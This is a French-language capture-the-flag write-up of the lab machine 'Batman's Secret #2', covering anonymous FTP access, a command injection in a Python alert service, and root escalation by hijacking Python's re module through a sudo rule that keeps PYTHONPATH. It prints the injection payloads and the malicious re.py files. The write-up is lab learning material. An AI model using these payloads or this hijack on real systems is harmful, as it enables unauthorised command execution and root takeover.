# Batman’s Secret #2

## 1. Informations générales

**Challenge :** Batman’s Secret #2
**IP cible :** `10.10.0.41`
**Objectif :** récupérer le fichier `/root/root.txt`
**Environnement :** Exegol / Boot2Root

### Flags obtenus

**User flag :**

```text
EPI{********}
```

**Root flag :**

```text
EPI{********}
```

---

# 2. Reconnaissance

Un scan Nmap permet d'identifier les services exposés :

```bash
nmap -sC -sV 10.10.0.41
```

Les ports intéressants sont :

```text
21/tcp   FTP
22/tcp   SSH
3000/tcp Gotham Hotline
```

Le serveur FTP autorise une connexion anonyme.

```bash
ftp 10.10.0.41
```

Connexion :

```text
Name: anonymous
```

Le répertoire FTP contient notamment :

```text
alert.py
logs/
```

Le fichier `alert.py` est récupéré afin d'analyser le fonctionnement du service exposé sur le port 3000.

---

# 3. Analyse de `alert.py`

Le script contient notamment :

```python
data = conn.recv(1024).strip().decode()

if data == "G0th4mN33dsTh3B4t!":
    conn.send(b'Authorized signal. What is the emergency?\n$> ')
    alert_text = conn.recv(1024).strip().decode()

    os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
```

Le serveur attend d'abord le mot de passe :

```text
G0th4mN33dsTh3B4t!
```

Puis récupère notre entrée dans `alert_text`.

Cette entrée est directement incorporée dans une commande shell passée à :

```python
os.system()
```

L'entrée utilisateur n'est donc pas correctement échappée.

Cela permet une **command injection**.

---

# 4. Exploitation de la command injection

Connexion au service :

```bash
nc 10.10.0.41 3000
```

Puis :

```text
G0th4mN33dsTh3B4t!
```

Une commande peut alors être injectée avec la structure :

```text
x'; COMMANDE; echo '
```

Cette technique permet de fermer la chaîne utilisée par le programme et d'exécuter notre propre commande.

---

# 5. Identification de l'utilisateur

Une première commande permet de déterminer sous quel utilisateur tourne le service :

```text
x'; id > /opt/hotline/logs/report.txt; echo '
```

Le résultat indique :

```text
uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)
```

Nous sommes donc limités à l'utilisateur :

```text
bruce
```

---

# 6. Recherche de privilèges sudo

La commande suivante permet de connaître les privilèges sudo de `bruce` :

```text
x'; sudo -l > /opt/hotline/logs/report.txt; echo '
```

Le résultat est particulièrement intéressant :

```text
User bruce may run the following commands on gotham:
    (root) NOPASSWD: /usr/bin/python3 /opt/scanner/gotham_scanner.py
```

On peut donc exécuter le script suivant en tant que root sans mot de passe :

```text
/usr/bin/python3 /opt/scanner/gotham_scanner.py
```

Les options sudo indiquent également :

```text
env_keep+=PYTHONPATH
```

C'est un élément important car `PYTHONPATH` permet d'influencer les répertoires dans lesquels Python recherche ses modules.

---

# 7. Analyse de `gotham_scanner.py`

Le script contient plusieurs imports, dont :

```python
import time
import re
```

Puis utilise le module `re` :

```python
res = re.search(r"(crime|misdeed|violence)", d)
```

Le problème est que `bruce` peut écrire dans :

```text
/opt/hotline/logs/
```

et que `PYTHONPATH` est conservé lors de l'utilisation de sudo.

Nous pouvons donc placer notre propre fichier :

```text
/opt/hotline/logs/re.py
```

Puis demander à Python de chercher ses modules dans ce répertoire.

---

# 8. Python module hijacking

Le principe est de créer un faux module `re.py`.

Le premier script utilisé était :

```python
import os

os.system("id > /opt/hotline/logs/root_check.txt")

def search(pattern, string):
    return None
```

Le fichier doit fournir une fonction `search()` car le programme principal utilise :

```python
re.search(...)
```

Sans cette fonction, le script principal provoquerait une erreur.

---

# 9. Création de `re.py`

Pour éviter les problèmes de caractères spéciaux lors de l'injection, le contenu Python est converti en Base64 :

```bash
echo 'import os

os.system("id > /opt/hotline/logs/root_check.txt")

def search(pattern, string):
    return None' | base64 -w0
```

La chaîne obtenue peut ensuite être envoyée à la machine via la command injection :

```text
x'; echo 'BASE64' | base64 -d > /opt/hotline/logs/re.py; echo '
```

Le fichier est ainsi créé dans :

```text
/opt/hotline/logs/re.py
```

---

# 10. Vérification de l'exécution en root

Le script `re.py` contient :

```python
os.system("id > /opt/hotline/logs/root_check.txt")
```

On lance ensuite le scanner avec :

```text
sudo PYTHONPATH=/opt/hotline/logs /usr/bin/python3 /opt/scanner/gotham_scanner.py
```

Le scanner importe :

```python
import re
```

Grâce à :

```text
PYTHONPATH=/opt/hotline/logs
```

Python charge notre :

```text
/opt/hotline/logs/re.py
```

au lieu du module standard attendu.

Le résultat récupéré dans `root_check.txt` est :

```text
uid=0(root) gid=0(root) groups=0(root)
```

Cela confirme que notre code Python est exécuté avec les privilèges root.

---

# 11. Recherche de `root.txt`

Une fois l'exécution root confirmée, le script `re.py` est modifié afin d'effectuer une recherche du fichier :

```python
import os

os.system("find / -name root.txt 2>/dev/null > /opt/hotline/logs/root_paths.txt")

def search(pattern, string):
    return None
```

Le scanner est ensuite relancé :

```text
sudo PYTHONPATH=/opt/hotline/logs /usr/bin/python3 /opt/scanner/gotham_scanner.py
```

Le résultat est récupéré par FTP :

```bash
ftp 10.10.0.41
```

Puis :

```text
anonymous
cd logs
get root_paths.txt
bye
```

Le contenu du fichier est :

```text
/root/root.txt
```

Le chemin du flag root est donc confirmé.

---

# 12. Lecture de `root.txt`

Le dernier `re.py` utilisé contient :

```python
import os

os.system("cat /root/root.txt > /opt/hotline/logs/root_flag.txt")

def search(pattern, string):
    return None
```

Le scanner est à nouveau exécuté avec :

```text
sudo PYTHONPATH=/opt/hotline/logs /usr/bin/python3 /opt/scanner/gotham_scanner.py
```

Puis le fichier est récupéré via FTP :

```bash
ftp 10.10.0.41
```

```text
anonymous
cd logs
get root_flag.txt
bye
```

Enfin :

```bash
cat root_flag.txt
```

Résultat :

```text
EPI{********}
```

---

# 13. Chaîne d'exploitation complète

La chaîne d'exploitation peut être résumée ainsi :

```text
Nmap
  │
  ▼
FTP anonymous
  │
  ├── alert.py
  └── logs/
        │
        ▼
Gotham Hotline :3000
        │
        ▼
Command Injection
        │
        ▼
Utilisateur bruce
        │
        ▼
sudo -l
        │
        ▼
NOPASSWD:
python3 /opt/scanner/gotham_scanner.py
        │
        ├── env_keep += PYTHONPATH
        │
        ▼
Création de /opt/hotline/logs/re.py
        │
        ▼
PYTHONPATH=/opt/hotline/logs
        │
        ▼
import re
        │
        ▼
Notre re.py est chargé
        │
        ▼
Code exécuté avec sudo
        │
        ▼
uid=0(root)
        │
        ▼
Lecture de /root/root.txt
        │
        ▼
EPI{********}
```

---

# 14. Vulnérabilités identifiées

## 14.1 Command injection

Le code :

```python
os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
```

insère directement une entrée utilisateur dans une commande shell.

Une solution correcte aurait été d'éviter complètement `os.system()` ou d'utiliser une API permettant d'écrire directement dans le fichier sans passer par un shell.

---

## 14.2 Mauvaise configuration sudo

`bruce` peut exécuter :

```text
/usr/bin/python3 /opt/scanner/gotham_scanner.py
```

en root sans mot de passe :

```text
NOPASSWD
```

Cela devient particulièrement dangereux avec :

```text
env_keep+=PYTHONPATH
```

---

## 14.3 Python module hijacking

Le script privilégié importe :

```python
import re
```

et l'environnement permet de contrôler le chemin de recherche des modules Python.

Un attaquant peut donc fournir un module malveillant nommé :

```text
re.py
```

qui sera chargé par le processus root.

---

# 15. Points importants à retenir

Cette machine illustre plusieurs concepts classiques de Boot2Root :

### Command injection

Toujours vérifier attentivement les appels à :

```python
os.system()
```

avec des données provenant de l'utilisateur.

### `sudo -l`

Après avoir obtenu un shell utilisateur, toujours vérifier :

```bash
sudo -l
```

Une entrée `NOPASSWD` peut constituer un vecteur d'escalade.

### Python + sudo

Lorsqu'un script Python peut être exécuté en root, examiner :

```python
import ...
```

et déterminer si les modules importés peuvent être contrôlés.

### `PYTHONPATH`

Une configuration telle que :

```text
env_keep+=PYTHONPATH
```

peut être particulièrement dangereuse lorsqu'un script Python est exécuté avec des privilèges élevés.

### Confirmation des privilèges

Il est important de vérifier réellement l'escalade plutôt que de simplement supposer qu'elle fonctionne :

```bash
id
```

Dans ce challenge :

```text
uid=0(root) gid=0(root) groups=0(root)
```

a confirmé l'exécution en root.

---

# 16. Flags

### Batman’s Secret #1

```text
EPI{********}
```

### Batman’s Secret #2

```text
EPI{********}
```

## Conclusion

L'exploitation repose sur deux vulnérabilités principales.

La première est une **command injection** dans le service Gotham Hotline, permettant d'obtenir l'exécution de commandes sous l'utilisateur `bruce`.

La seconde est une **élévation de privilèges par détournement de module Python (`PYTHONPATH`)**. Le compte `bruce` peut exécuter `gotham_scanner.py` avec `sudo` en conservant `PYTHONPATH`. En plaçant un fichier `re.py` contrôlé par l'utilisateur dans un répertoire prioritaire, celui-ci est chargé à la place du module attendu.

Le code du module est alors exécuté avec les privilèges de `root`, permettant finalement de lire :

```text
/root/root.txt
```

et d'obtenir :

```text
EPI{********}
```
